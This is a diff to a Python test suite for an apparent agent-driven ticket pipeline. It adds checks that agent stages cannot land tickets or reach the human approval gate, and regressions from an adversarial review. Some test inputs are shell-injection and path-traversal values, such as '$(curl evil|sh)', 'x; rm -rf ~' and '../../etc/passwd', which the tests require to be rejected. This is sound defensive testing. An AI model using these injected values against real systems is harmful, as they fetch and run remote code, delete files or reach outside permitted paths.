@@ -5,6 +5,7 @@
 # ///
 """Checks for the parts that silently rot: the transition table's bounds and
 the Tier A gate. Run: ./test_pipeline.py"""
+import os
 import shutil
 import subprocess
 import sys
@@ -67,12 +68,26 @@ def test_unknown_result_escalates_rather_than_guesses():
     assert t("implementing", "")[0] == "escalated"
 
 
-def test_no_agent_can_reach_a_human_gate_or_a_terminal_state():
-    reachable = {t(s, r)[0] for s in P.agent_stages() for r in
-                 ["ok", "fail", "blocked", "rejected", "junk"]}
-    assert "awaiting-approval" not in {t(s, r)[0] for s in P.agent_stages() if s != "plan-validation"
-                                       for r in ["ok", "fail", "blocked", "rejected"]}
-    assert "done" not in reachable, "an agent stage must never reach `done`"
+def test_no_agent_can_reach_a_human_gate_or_land_a_ticket():
+    """`verifying` is not in agent_stages() -- it is script-run -- so include it
+    explicitly, otherwise this asserts nothing about the stage that guards `done`."""
+    stages = P.agent_stages() + ["verifying"]
+    assert "verifying" not in P.agent_stages(), "verifying must have no agent prompt"
+    results = ["ok", "fail", "blocked", "rejected", "junk"]
+
+    for stage in P.agent_stages():          # verifying is the dispatcher's own
+        for r in results:
+            assert t(stage, r)[0] != "done", \
+                f"agent stage `{stage}` reached `done` on result {r!r}"
+
+    for stage in stages:
+        for r in results:
+            assert t(stage, r)[0] != "awaiting-approval" or stage == "plan-validation", \
+                f"`{stage}` reached the human approval gate on {r!r}"
+
+    # only these stages may terminate a ticket, and only on these results
+    assert t("triage", "rejected")[0] == "rejected"
+    assert t("verifying", "ok")[0] == "done"
 
 
 # --- gate ------------------------------------------------------------------
@@ -152,9 +167,20 @@ def test_gate_blocks_a_test_that_errors_instead_of_failing():
 
 
 def test_project_commands_do_not_inherit_the_dispatchers_venv():
-    env = P.project_env()
+    """Assert the stripping actually happens, rather than passing by luck when
+    the suite is run outside a venv."""
+    fake = "/tmp/fake-venv-xyz"
+    saved = dict(os.environ)
+    os.environ["VIRTUAL_ENV"] = fake
+    os.environ["PYTHONPATH"] = "/tmp/leak"
+    os.environ["PATH"] = f"{fake}/bin:/usr/bin"
+    try:
+        env = P.project_env()
+    finally:
+        os.environ.clear(); os.environ.update(saved)
     assert "VIRTUAL_ENV" not in env
-    assert not any("uv/environments" in d for d in env["PATH"].split(":")), env["PATH"]
+    assert "PYTHONPATH" not in env
+    assert env["PATH"] == "/usr/bin", env["PATH"]
 
 
 def test_gate_blocks_empty_files_declared():
@@ -277,6 +303,160 @@ def test_no_decisions_section_records_nothing():
     meta, body = P.load_ticket(d / ".project/tickets/TICKET-001.md")
     assert P.record_decision(d, meta, body) is None
     shutil.rmtree(d)
+
+
+# --- regressions from the adversarial review -----------------------------
+
+def test_frontmatter_that_reaches_a_shell_is_validated():
+    ok = {"id": "TICKET-001", "branch": "ticket/001",
+          "test_file": "tests/t.py::test_x", "files_declared": ["src/a.py"]}
+    assert P.validate_meta(ok) == []
+    for field, value in [
+        ("test_file", "t.py::x; touch /tmp/PWNED"),
+        ("branch", "x; rm -rf ~"),
+        ("id", "$(curl evil|sh)"),
+        ("id", "../../etc/passwd"),
+        ("id", "/tmp/elsewhere"),
+        ("stage", "done-ish"),
+    ]:
+        assert P.validate_meta({**ok, field: value}), f"{field}={value!r} accepted"
+    assert P.validate_meta({**ok, "files_declared": ["../../etc/passwd"]})
+    assert P.validate_meta({**ok, "files_declared": ["/etc/passwd"]})
+
+
+def test_shell_injection_through_test_file_is_dead():
+    """The gate runs the project's test command; test_file comes from an agent."""
+    d = _project()
+    marker = d / "PWNED"
+    path = d / ".project/tickets/TICKET-001.md"
+    meta, body = P.load_ticket(path)
+    meta["test_file"] = f"test_thing.py::test_x; touch {marker}"
+    P.save_ticket(path, meta, body)
+    (d / ".project" / "pipeline.toml").write_text(
+        'test_one = "echo {test}"\ntest_suite = "true"\n'
+        'test_suite_without_new = "echo {test}"\n')
+    assert P.validate_meta(meta), "validation must reject it before anything runs"
+    P.gate(d, "TICKET-001")
+    assert not marker.exists(), "command substitution executed"
+    shutil.rmtree(d)
+
+
+def test_control_fields_are_the_dispatchers_alone():
+    assert {"stage", "counters", "branch", "id", "lease"} <= P.CONTROL_FIELDS
+    for field in ("test_file", "files_declared"):
+        assert field not in P.CONTROL_FIELDS, f"{field} is claimed via the sidecar"
+
+
+def test_escalated_tickets_keep_their_worktree():
+    assert "escalated" in P.TERMINAL
+    assert "escalated" not in P.CLEANUP_STAGES, \
+        "removing it destroys the uncommitted evidence a human was called for"
+    assert P.CLEANUP_STAGES == {"done", "rejected"}
+
+
+def test_an_acceptance_criterion_must_name_something_test_shaped():
+    d = _project(FIXTURE.replace("- `test_broken` passes", "- latency drops below `10ms`"))
+    ok, failures = P.gate(d, "TICKET-001")
+    assert not ok and any("names no test" in f for f in failures), failures
+    shutil.rmtree(d)
+
+    d = _project(FIXTURE.replace("- `test_broken` passes",
+                                 "- `tests/test_cache.py::test_evicts` passes"))
+    ok, failures = P.gate(d, "TICKET-001")
+    assert ok, failures
+    shutil.rmtree(d)
+
+
+def test_a_result_verdict_survives_a_crash_before_it_is_applied():
+    d = _project()
+    P.result_file(d, "TICKET-001").write_text("result: ok\nsummary: x\n")
+    assert P.read_result(d, "TICKET-001", keep=True) == {"result": "ok", "summary": "x"}
+    assert P.result_file(d, "TICKET-001").is_file(), \
+        "the verdict must stay on disk until it has been acted on"
+    P.drop_result(d, "TICKET-001")
+    assert P.read_result(d, "TICKET-001") is None
+    shutil.rmtree(d)
+
+
+def test_a_corrupt_result_file_does_not_crash_the_dispatcher():
+    d = _project()
+    P.result_file(d, "TICKET-001").write_text("{[not: valid: yaml")
+    assert P.read_result(d, "TICKET-001") == {}
+    P.result_file(d, "TICKET-001").write_text("- a list, not a mapping")
+    assert P.read_result(d, "TICKET-001") == {}
+    shutil.rmtree(d)
+
+
+def test_resume_refuses_a_stage_that_does_not_exist():
+    d = Path(tempfile.mkdtemp())
+    run = lambda *a: subprocess.run([sys.executable, str(HERE / "pipeline.py"),
+                                     "--project", str(d), *a],
+                                    capture_output=True, text=True)
+    run("new", "t")
+    r = run("resume", "TICKET-001", "--stage", "implementng")   # typo
+    assert r.returncode != 0 and "is not a stage" in r.stderr, r
+    r = run("resume", "TICKET-001", "--stage", "planning")
+    assert r.returncode == 0, r.stderr
+    shutil.rmtree(d)
+
+
+def _git_project():
+    d = Path(tempfile.mkdtemp())
+    sh = lambda c: subprocess.run(c, shell=True, cwd=d, capture_output=True, text=True)
+    sh("git init -qb main && git config user.email t@t && git config user.name t")
+    (d / "f.py").write_text("base\n")
+    sh("git add -A && git commit -qm init")
+    (d / ".project" / "tickets").mkdir(parents=True)
+    (d / ".project" / "pipeline.toml").write_text(
+        'test_one="true"\ntest_suite="true"\ntest_suite_without_new="true"\nbase="main"\n')
+    return d, sh
+
+
+def test_recreating_a_worktree_never_resets_the_branch():
+    """`git worktree add -B` resets to base -- it would silently discard every
+    commit a ticket made before it was escalated or resumed."""
+    d, sh = _git_project()
+    meta = {"id": "TICKET-001", "branch": "ticket/001"}
+    cfg = {"base": "main"}
+    wt = P.ensure_worktree(d, meta, cfg)
+    (wt / "new.py").write_text("ticket work\n")
+    subprocess.run("git add -A && git commit -qm 'ticket commit'", shell=True,
+                   cwd=wt, capture_output=True)
+    before = sh("git rev-parse ticket/001").stdout.strip()
+
+    P.drop_worktree(d, meta)
+    P.ensure_worktree(d, meta, cfg)          # the resume path
+    after = sh("git rev-parse ticket/001").stdout.strip()
+
+    assert after == before, "recreating the worktree discarded the ticket's commits"
+    assert "ticket commit" in sh("git log --oneline ticket/001").stdout
+    shutil.rmtree(d, ignore_errors=True)
+
+
+def test_an_escalated_ticket_keeps_its_worktree_and_its_evidence():
+    d, _ = _git_project()
+    meta = {"id": "TICKET-001", "branch": "ticket/001"}
+    wt = P.ensure_worktree(d, meta, {"base": "main"})
+    (wt / "half-finished.py").write_text("uncommitted evidence\n")
+
+    (d / ".project/tickets/TICKET-001.md").write_text(
+        FIXTURE.replace("stage: plan-validation", "stage: escalated"))
+    P.start(d, d / ".project/tickets/TICKET-001.md", P.harness("fake"), {})
+
+    assert wt.is_dir(), "the worktree a human was escalated to inspect was deleted"
+    assert (wt / "half-finished.py").exists()
+    shutil.rmtree(d, ignore_errors=True)
+
+
+def test_a_done_ticket_does_release_its_worktree():
+    d, _ = _git_project()
+    meta = {"id": "TICKET-001", "branch": "ticket/001"}
+    wt = P.ensure_worktree(d, meta, {"base": "main"})
+    (d / ".project/tickets/TICKET-001.md").write_text(
+        FIXTURE.replace("stage: plan-validation", "stage: done"))
+    P.start(d, d / ".project/tickets/TICKET-001.md", P.harness("fake"), {})
+    assert not wt.is_dir(), "a finished ticket should not leave a worktree behind"
+    shutil.rmtree(d, ignore_errors=True)
 
 
 def test_ticket_roundtrips():
